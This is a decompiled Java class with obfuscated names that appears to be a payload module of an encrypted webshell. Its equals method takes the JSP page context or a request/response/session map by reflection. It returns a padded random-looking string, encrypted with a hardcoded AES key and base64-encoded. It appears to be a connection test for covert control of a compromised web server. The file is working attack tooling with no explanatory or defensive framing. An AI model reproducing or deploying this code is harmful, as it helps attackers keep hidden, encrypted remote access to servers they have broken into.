/*
 * Decompiled with CFR 0.152.
 */
package org.slczac.fkejptb.zkjj;

import java.lang.reflect.Method;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.Random;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class Lkvdd {
    public static String content;
    public static String payloadBody;
    private Object Request;
    private Object Response;
    private Object Session;

    public Lkvdd() {
        content = "";
        content = content + "Ec4PiYIw5zd1RHtk6q2trr5GFLD7W4tiuw4e8Qf66ibo5goOwqIfuV0StNDmOrG2psVOxxDxI1vU3HhCMNbSzF7alpQmo0NNUSjl6oJAJBfd8NvQ31PCfSDuaNMOsnNH6kETPve6j1lFuZim9R0ZsHPIHvnwETiIGI9Cv9MG1M1PICQlHekcucue1dinvQLSTN7RM3BHN1r7h3GQVUqPvwGGpQOqNziIK9EPSYLBsUoxVb3nmwMSktHOwMLIxzzAYgaLZ3GClu4wvSBdmeMTDgqodTTZmkwApWQD3xIPTFZ0RVdZox3LxLW6EdFByrdrcPapy3GnEOUFbJJV9b39yOfKS8tNii8IdkoLwDmdyz2crEncALGQX2DjXfTnVPZdpDPlz8baY37Hf3LlCyi0mN2doUAV3kOnn8uyd5OazrNuH0nnIm7L8CEA56rcMTzlQLfR0qXUC3NEXFfZh3d1vFbLFk4503dKk6iEisXZklL3hqEPSuFPFQUFkNDRreQ3M4kvCCA5zXttrpZvo51uOWss5sXV77NOrx52wtSHrnIC3bJKDABr1dv1ufiMeTvrqAhtlGRcxIXzzC0jbPGeW87VGHPBPFwP0i9hnat0I8od9Lw9Reczoz016ek7vsaG6OqMR4Am19DX4fwdVDfWVhmqjKpIaggwHyG0bWGjA71pataphSmt8BRsGCAkRmL9EFlaoVX1YXCnKcHuposF3nYM6gxheR7o0F0ED8npAxBLye6OY3t12ypquhNPJQZU6nhuKMB6f8s2bsH4EvLi3xdZoit7N2ceZe1t9y5Y7nFntJ7fdXfGmlH6mvU5czg6CCsvCakoFD1fvc830NgFnL1DxA2vbynRquWOlDEDNBpUCK5CI08poOQfNoECSQCgFfat6USVinvsAxKikWlBTJlXilAUrgIh4Z5wBm5drIHxtMwZLHIac4wCr5qCmf9alKLzHkb2J6UxbMeGkV5xE2RQkeF8JXKS3foR5YX1RvKFOSI8Y1GaGoVCEg6AyVwv8xZ2ZLxhR4ytIXd2sVk36qRlUxtIZMb3TewgUqIEw1MfnGTC9wu2LfvBlcCoEPLfLRsWqyiOQD4K0rSNRgIOtvphVBWoSJVQngPOsCy0O1ZUOTRIhn2zJowKgyhs1LoUsyHUoQDXhXjWl5tKtK8NfGN2hFN1MqagV5dyjbdiafP60IvTY3TnizqYdYH4tEGobI2preL2FoSkVjdTKngNcc6NcA2DnaSh7kgrSqlHNqqhhS1i2y9Xj5IpQtOoWteIwBZ4227r3FH7mAjH4MGVntaX2hxSbbwxp1S9NtWTm7rStC7GmRwac1Qsjoa51VMlrZRa5i7Y2MPAyftN1GGNEWLAs2dsuiS9mtKniJ1bb4TXz2qxVDqvhhGeJtsV9JiwxyCLgJSjYDAGGmwlqV4o3CTztkK2vtqGEqwoPDAuuEvw5Nipf3GeE8VQc7mOY1gWkDQu3bo7knZLI29mV8nPWAHx3EwnK6xpVrSK4uTXXQ9JvMTp2ae689VkKZwRCWbJan9iF3QKxAgyOR8HAu5MU2XlUSPEJ8n3io1e6NXFCXEOZohhO220rXEt0UVbDFCuOKMHid8PHiHEkzPD2MAAfbHGrvd0MGKmyvnfLw8oT9EKkO2mgKwgRI8osVobUoTUS7l0UZSJ3mQKP8xGBGEmzWi24CcnkHgdxky9rYe5RNTx4y10t30AMnOHOyrWcWMda328LAmug5RJlQwpLr4nB7cGBEhG5gPXp4C5PCD3VkOzdqh5zIp4QNoqwubXfkMcgfO8FvYH7n3t40cLXqsSnRTdeKT6ZzmXAulXngRSyg3fFrjYuRpz2iU6OkReXD5wwJ1V7xJ1ylK5boovuqwXzb35f04CLDzmXl8JpD9bmpGXkrHybHw8";
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     * Loose catch block
     */
    public boolean equals(Object obj) {
        block10: {
            LinkedHashMap<String, String> result = new LinkedHashMap<String, String>();
            this.fillContext(obj);
            result.put("status", "success");
            result.put("msg", content);
            try {
                Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                Method write = so.getClass().getMethod("write", byte[].class);
                write.invoke(so, new Object[]{this.Encrypt(this.buildJson(result, true).getBytes("UTF-8"))});
                so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
                so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
            }
            catch (Exception e) {
                e.printStackTrace();
            }
            break block10;
            catch (Exception e) {
                try {
                    result.put("msg", e.getMessage());
                    result.put("status", "success");
                }
                catch (Throwable throwable) {
                    try {
                        Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                        Method write = so.getClass().getMethod("write", byte[].class);
                        write.invoke(so, new Object[]{this.Encrypt(this.buildJson(result, true).getBytes("UTF-8"))});
                        so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
                        so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
                    }
                    catch (Exception e2) {
                        e2.printStackTrace();
                    }
                    throw throwable;
                }
                try {
                    Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                    Method write = so.getClass().getMethod("write", byte[].class);
                    write.invoke(so, new Object[]{this.Encrypt(this.buildJson(result, true).getBytes("UTF-8"))});
                    so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
                    so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
                }
                catch (Exception e3) {
                    e3.printStackTrace();
                }
            }
        }
        return true;
    }

    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");
        for (String key : entity.keySet()) {
            sb.append("\"" + key + "\":\"");
            String value = entity.get(key);
            if (encode) {
                value = this.base64encode(value.getBytes());
            }
            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("}");
        return sb.toString();
    }

    private void fillContext(Object obj) throws Exception {
        if (obj.getClass().getName().indexOf("PageContext") >= 0) {
            this.Request = obj.getClass().getMethod("getRequest", new Class[0]).invoke(obj, new Object[0]);
            this.Response = obj.getClass().getMethod("getResponse", new Class[0]).invoke(obj, new Object[0]);
            this.Session = obj.getClass().getMethod("getSession", new Class[0]).invoke(obj, new Object[0]);
        } else {
            Map objMap = (Map)obj;
            this.Session = objMap.get("session");
            this.Response = objMap.get("response");
            this.Request = objMap.get("request");
        }
        this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
    }

    private String base64encode(byte[] data) throws Exception {
        String result = "";
        String version = System.getProperty("java.version");
        try {
            this.getClass();
            Class<?> Base64 = Class.forName("java.util.Base64");
            Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
            result = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, new Object[]{data});
        }
        catch (Throwable error) {
            this.getClass();
            Class<?> Base64 = Class.forName("sun.misc.BASE64Encoder");
            Object Encoder = Base64.newInstance();
            result = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, new Object[]{data});
            result = result.replace("\n", "").replace("\r", "");
        }
        return result;
    }

    private byte[] getMagic() throws Exception {
        String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
        int magicNum = Integer.parseInt(key.substring(0, 2), 16) % 16;
        Random random = new Random();
        byte[] buf = new byte[magicNum];
        for (int i = 0; i < buf.length; ++i) {
            buf[i] = (byte)random.nextInt(256);
        }
        return buf;
    }

    private byte[] Encrypt(byte[] byArray) throws Exception {
        String string = "bc2172db605712b9";
        byte[] byArray2 = string.getBytes("utf-8");
        SecretKeySpec secretKeySpec = new SecretKeySpec(byArray2, "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, secretKeySpec);
        byte[] byArray3 = cipher.doFinal(byArray);
        try {
            Class<?> clazz = Class.forName("java.util.Base64");
            Object object = clazz.getMethod("getEncoder", null).invoke(clazz, null);
            byArray3 = (byte[])object.getClass().getMethod("encode", byte[].class).invoke(object, new Object[]{byArray3});
        }
        catch (Throwable throwable) {
            Class<?> clazz = Class.forName("sun.misc.BASE64Encoder");
            Object obj = clazz.newInstance();
            String string2 = (String)obj.getClass().getMethod("encode", byte[].class).invoke(obj, new Object[]{byArray3});
            string2 = string2.replace("\n", "").replace("\r", "");
            byArray3 = string2.getBytes();
        }
        return byArray3;
    }
}
